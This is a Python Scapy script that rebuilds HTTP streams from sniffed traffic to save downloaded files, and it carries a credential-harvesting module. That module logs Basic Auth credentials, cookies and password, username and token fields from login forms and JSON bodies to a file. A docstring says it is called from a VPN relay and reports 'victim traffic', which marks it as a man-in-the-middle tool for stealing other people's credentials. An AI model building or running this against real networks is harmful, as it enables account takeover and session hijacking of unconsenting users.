#!/usr/bin/env python3
"""
HTTP Object Interceptor — captures files downloaded over HTTP.
Equivalent to Wireshark's Export Objects > HTTP.
Reassembles TCP streams before parsing, handles chunked encoding.
"""
VERSION = "1.2"

import base64
import datetime
import json
import os
import re
import gzip
import zlib
import argparse
from collections import defaultdict
from urllib.parse import parse_qs
from scapy.all import sniff, IP, TCP, Raw, get_if_list

INTERCEPT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "intercepted")
os.makedirs(INTERCEPT_DIR, exist_ok=True)

# stream_key: (server_ip, 80, client_ip, client_port)
# Each stream tracks its reassembly buffer and next expected sequence number.
# "trusted" is only set when we've seen the SYN-ACK — streams joined mid-flight
# are discarded to avoid saving body bytes misinterpreted as headers.
streams = defaultdict(lambda: {"buf": b"", "next_seq": None, "ooo": {}, "trusted": False})

HTTP_PORT = 80        # overridden by argparse at startup
ATTACHMENT_ONLY = True  # overridden by --all flag
VERBOSE = False         # overridden by --verbose flag

# ── Credential capture globals ─────────────────────────────────────────────────

CRED_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "creds.log")

# Keys in form bodies / JSON objects that suggest credential values
CRED_KEYS = {
    "user", "username", "email", "login", "mail", "account",
    "password", "passwd", "pwd", "pass", "secret",
    "token", "auth", "credential", "api_key", "apikey",
}

# Separate stream table for client→server (request) direction
req_streams = defaultdict(lambda: {"buf": b"", "next_seq": None, "ooo": {}, "trusted": False})


# ── TCP reassembly ─────────────────────────────────────────────────────────────

def add_segment(stream, seq, payload):
    """Insert a TCP segment in order, buffering out-of-order arrivals."""
    if stream["next_seq"] is None:
        stream["next_seq"] = seq

    if seq == stream["next_seq"]:
        stream["buf"] += payload
        stream["next_seq"] += len(payload)
        # Drain any out-of-order segments that are now contiguous
        while stream["next_seq"] in stream["ooo"]:
            chunk = stream["ooo"].pop(stream["next_seq"])
            stream["buf"] += chunk
            stream["next_seq"] += len(chunk)
    elif seq > stream["next_seq"]:
        stream["ooo"][seq] = payload  # hold until the gap is filled


# ── HTTP parsing ───────────────────────────────────────────────────────────────

def decode_chunked(data):
    """
    Decode chunked transfer-encoding.
    Returns (body_bytes, leftover_bytes) on success, or (None, None) if incomplete.
    """
    body = b""
    pos = 0
    while True:
        crlf = data.find(b"\r\n", pos)
        if crlf == -1:
            return None, None
        try:
            chunk_size = int(data[pos:crlf].split(b";")[0], 16)
        except ValueError:
            return None, None
        if chunk_size == 0:
            return body, data[crlf + 2:]
        chunk_end = crlf + 2 + chunk_size
        if chunk_end + 2 > len(data):
            return None, None  # body not fully received yet
        body += data[crlf + 2:chunk_end]
        pos = chunk_end + 2


def try_extract(stream_key):
    """
    Walk the stream buffer looking for complete HTTP responses.
    A single TCP connection may carry multiple request/response pairs (keep-alive).
    """
    stream = streams[stream_key]
    buf = stream["buf"]

    while True:
        sep = buf.find(b"\r\n\r\n")
        if sep == -1:
            break

        try:
            header_text = buf[:sep].decode("utf-8", errors="replace")
        except Exception:
            break

        lines = header_text.split("\r\n")
        if not lines[0].startswith("HTTP/"):
            # Not the start of an HTTP response — skip forward and retry
            buf = buf[sep + 4:]
            continue

        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip().lower()] = v.strip()

        body_start = sep + 4
        cl_header = headers.get("content-length")
        te_header = headers.get("transfer-encoding", "").lower()

        if cl_header is not None:
            try:
                content_length = int(cl_header)
            except ValueError:
                break
            if len(buf) < body_start + content_length:
                break  # wait for the rest of the body
            body = buf[body_start:body_start + content_length]
            buf = buf[body_start + content_length:]

        elif "chunked" in te_header:
            body, remainder = decode_chunked(buf[body_start:])
            if body is None:
                break  # wait for more chunks
            buf = remainder if remainder else b""

        else:
            # No length info — consume what we have and stop reassembling
            body = buf[body_start:]
            buf = b""

        save_object(headers, body, stream_key)

    stream["buf"] = buf


# ── File saving ────────────────────────────────────────────────────────────────

EXT_MAP = {
    "text/plain":               ".txt",
    "text/csv":                 ".csv",
    "application/pdf":          ".pdf",
    "application/zip":          ".zip",
    "application/x-zip-compressed": ".zip",
    "application/gzip":         ".gz",
    "application/octet-stream": ".bin",
    "application/json":         ".json",
    "image/jpeg":               ".jpg",
    "image/png":                ".png",
    "image/gif":                ".gif",
}

SKIP_TYPES = {"text/html", "text/css", "application/javascript", "text/javascript"}


def decompress_body(headers, body):
    """Decompress gzip/deflate body if Content-Encoding says so."""
    encoding = headers.get("content-encoding", "").lower()
    try:
        if "gzip" in encoding:
            return gzip.decompress(body)
        if "deflate" in encoding:
            return zlib.decompress(body)
    except Exception as e:
        if VERBOSE:
            print(f"[!] Decompression failed ({encoding}): {e}")
    return body


def save_object(headers, body, stream_key):
    if not body:
        return

    raw_ct = headers.get("content-type", "application/octet-stream")
    content_type = raw_ct.split(";")[0].strip().lower()
    disposition = headers.get("content-disposition", "")

    if VERBOSE:
        src, _, dst, dport = stream_key
        print(f"[~] Response from {src}  Content-Type: {raw_ct}  "
              f"Content-Encoding: {headers.get('content-encoding', '-')}  "
              f"Content-Disposition: {disposition or '-'}  "
              f"Body: {len(body)} bytes  preview: {body[:60]!r}")

    # Pull filename from Content-Disposition: attachment; filename="..."
    filename = None
    m = re.search(r'filename\*?=(?:UTF-8\'\')?["\']?([^"\';\r\n]+)["\']?', disposition, re.IGNORECASE)
    if m:
        filename = m.group(1).strip()

    is_attachment = "attachment" in disposition.lower()

    # In default mode only save explicit file downloads; --all saves everything.
    if ATTACHMENT_ONLY and not is_attachment:
        return

    # Skip page assets when running in --all mode
    if not is_attachment and content_type in SKIP_TYPES:
        return

    # Decompress before saving so the file is human-readable
    body = decompress_body(headers, body)

    if not filename:
        ext = EXT_MAP.get(content_type, ".bin")
        src, sport, dst, dport = stream_key
        filename = f"object_{src}_{dport}{ext}"

    filename = re.sub(r'[^\w\-_\.]', '_', os.path.basename(filename))

    filepath = os.path.join(INTERCEPT_DIR, filename)
    base, ext = os.path.splitext(filename)
    counter = 1
    while os.path.exists(filepath):
        filepath = os.path.join(INTERCEPT_DIR, f"{base}_{counter}{ext}")
        counter += 1

    with open(filepath, "wb") as f:
        f.write(body)

    src, _, dst, dport = stream_key
    print(f"[+] {os.path.basename(filepath)}  {len(body)} bytes  [{content_type}]  {src} -> {dst}:{dport}")


# ── Credential capture ─────────────────────────────────────────────────────────

def _log_cred(src_ip: str, dst_ip: str, dst_port: int, label: str, value: str) -> None:
    ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {src_ip} -> {dst_ip}:{dst_port}  {label}: {value}"
    print(f"[CRED] {line}")
    try:
        with open(CRED_LOG, "a") as f:
            f.write(line + "\n")
    except OSError:
        pass


def _extract_creds_from_request(buf: bytes, src_ip: str, dst_ip: str, dst_port: int) -> bytes:
    """Walk the reassembled request buffer, extract credentials, consume complete requests."""
    while True:
        sep = buf.find(b"\r\n\r\n")
        if sep == -1:
            break

        try:
            header_text = buf[:sep].decode("utf-8", errors="replace")
        except Exception:
            break

        lines   = header_text.split("\r\n")
        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip().lower()] = v.strip()

        body_start = sep + 4

        # Authorization: Basic <base64>
        auth = headers.get("authorization", "")
        if auth.lower().startswith("basic "):
            try:
                decoded = base64.b64decode(auth[6:]).decode("utf-8", errors="replace")
                _log_cred(src_ip, dst_ip, dst_port, "BasicAuth", decoded)
            except Exception:
                pass

        # Cookie header (session tokens)
        cookie = headers.get("cookie", "")
        if cookie:
            _log_cred(src_ip, dst_ip, dst_port, "Cookie", cookie[:300])

        # Determine body bounds
        cl_str = headers.get("content-length")
        if cl_str is not None:
            try:
                body_len = int(cl_str)
            except ValueError:
                buf = buf[body_start:]
                continue
            if len(buf) < body_start + body_len:
                break  # body not fully received yet — wait
            body = buf[body_start : body_start + body_len]
            buf  = buf[body_start + body_len :]
        else:
            # No Content-Length (GET/HEAD/etc.) — headers only, no body to parse
            buf = buf[body_start:]
            continue

        ct = headers.get("content-type", "").lower()

        # application/x-www-form-urlencoded (standard login forms)
        if "application/x-www-form-urlencoded" in ct and body:
            try:
                params = parse_qs(body.decode("utf-8", errors="replace"),
                                  keep_blank_values=True)
                for k, vals in params.items():
                    if k.lower() in CRED_KEYS:
                        _log_cred(src_ip, dst_ip, dst_port, f"POST[{k}]", ", ".join(vals))
            except Exception:
                pass

        # application/json (API-style logins)
        elif "application/json" in ct and body:
            try:
                data = json.loads(body.decode("utf-8", errors="replace"))
                if isinstance(data, dict):
                    for k, v in data.items():
                        if k.lower() in CRED_KEYS and isinstance(v, (str, int)):
                            _log_cred(src_ip, dst_ip, dst_port, f"JSON[{k}]", str(v))
            except Exception:
                pass

    return buf


def cred_handler(pkt) -> None:
    """Sniff HTTP requests (client → server) for credentials."""
    if not (IP in pkt and TCP in pkt):
        return
    if pkt[TCP].dport != HTTP_PORT:
        return

    tcp        = pkt[TCP]
    stream_key = (pkt[IP].src, tcp.sport, pkt[IP].dst, tcp.dport)
    stream     = req_streams[stream_key]
    flags      = int(tcp.flags)

    # SYN (not SYN-ACK): start of client→server stream
    if flags & 0x02 and not (flags & 0x10):
        stream["next_seq"] = tcp.seq + 1
        stream["trusted"]  = True
        return

    # FIN or RST: discard state
    if flags & 0x05:
        req_streams.pop(stream_key, None)
        return

    if not stream["trusted"] or Raw not in pkt:
        return

    add_segment(stream, tcp.seq, bytes(pkt[Raw].load))
    stream["buf"] = _extract_creds_from_request(
        stream["buf"], pkt[IP].src, pkt[IP].dst, tcp.dport
    )


# ── Packet handler ─────────────────────────────────────────────────────────────

def packet_handler(pkt):
    if not (IP in pkt and TCP in pkt):
        return
    if pkt[TCP].sport != HTTP_PORT:
        return  # only care about server→client traffic

    tcp = pkt[TCP]
    stream_key = (pkt[IP].src, tcp.sport, pkt[IP].dst, tcp.dport)
    stream = streams[stream_key]
    flags = int(tcp.flags)

    # SYN-ACK: marks the true start of a server→client stream.
    # tcp.seq here is the server's ISN; the first data byte is ISN+1.
    if flags & 0x12 == 0x12:  # SYN + ACK
        stream["next_seq"] = tcp.seq + 1
        stream["trusted"] = True
        return

    # FIN or RST: connection is done, drop state.
    if flags & 0x05:  # FIN=0x01, RST=0x04
        streams.pop(stream_key, None)
        return

    # Discard any stream we didn't witness from SYN-ACK — its buffer offset
    # is unknown and would produce garbage saves.
    if not stream["trusted"]:
        return

    if Raw not in pkt:
        return

    add_segment(stream, tcp.seq, bytes(pkt[Raw].load))
    try_extract(stream_key)


# ── Unified sniff loop (called by vpn_relay.py) ────────────────────────────────

def sniff_loop(iface=None, exclude_src_ips=None) -> None:
    """Sniff HTTP traffic, dispatching to the object handler and credential handler.

    exclude_src_ips: set/list of IP strings to ignore as traffic sources.
    Pass our own interface IPs here so we don't log our own connections — only
    victim traffic (forwarded packets with a foreign source IP) is reported.

    Victim traffic identification: forwarded packets have src IP != any of our
    own IPs.  Check pkt[IP].src not in exclude_src_ips before processing.
    """
    exclude = set(exclude_src_ips or [])

    def _dispatch(pkt):
        if IP not in pkt:
            return
        if exclude and pkt[IP].src in exclude:
            return  # skip our own locally-generated connections
        packet_handler(pkt)
        cred_handler(pkt)

    sniff(
        iface=iface,
        filter=f"tcp port {HTTP_PORT}",
        prn=_dispatch,
        store=False,
    )


# ── Tun auto-detection (standalone mode) ───────────────────────────────────────

def _auto_tun_iface() -> str | None:
    """Return the first up tun*/tap* interface on Linux, or None."""
    import glob as _glob
    for state_path in _glob.glob("/sys/class/net/tun*/operstate") + \
                      _glob.glob("/sys/class/net/tap*/operstate"):
        try:
            with open(state_path) as f:
                if f.read().strip() == "up":
                    return state_path.split("/")[4]
        except OSError:
            continue
    return None


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"HTTP Object Interceptor v{VERSION} — saves downloaded files from HTTP traffic"
    )
    parser.add_argument("-i", "--iface", default=None,
                        help="Interface to sniff on (default: auto-detect tun, then Scapy default)")
    parser.add_argument("-p", "--port", type=int, default=80,
                        help="HTTP port to monitor (default: 80)")
    parser.add_argument("--all", action="store_true",
                        help="Save all non-HTML responses, not just Content-Disposition: attachment")
    parser.add_argument("--verbose", action="store_true",
                        help="Print each HTTP response's headers and body preview before saving")
    parser.add_argument("--list-ifaces", action="store_true",
                        help="List available network interfaces and exit")
    args = parser.parse_args()

    if args.list_ifaces:
        print("Available interfaces:")
        for iface in get_if_list():
            print(f"  {iface}")
        raise SystemExit(0)

    HTTP_PORT = args.port
    ATTACHMENT_ONLY = not args.all
    VERBOSE = args.verbose

    # When no interface specified, prefer tun (plaintext tunnel traffic) over
    # the Scapy default physical interface (which carries encrypted VPN UDP).
    sniff_iface = args.iface or _auto_tun_iface()

    print(f"HTTP Object Interceptor v{VERSION}")
    print(f"Output dir : {INTERCEPT_DIR}")
    print(f"Interface  : {sniff_iface or 'default'}" +
          ("  (auto-detected tun)" if sniff_iface and not args.iface else ""))
    print(f"Port filter: tcp port {HTTP_PORT}")
    print(f"Mode       : {'attachment-only' if ATTACHMENT_ONLY else 'capture all'}")
    print("Ctrl+C to stop.\n")

    sniff(
        iface=sniff_iface,
        filter=f"tcp port {HTTP_PORT}",
        prn=packet_handler,
        store=False,
    )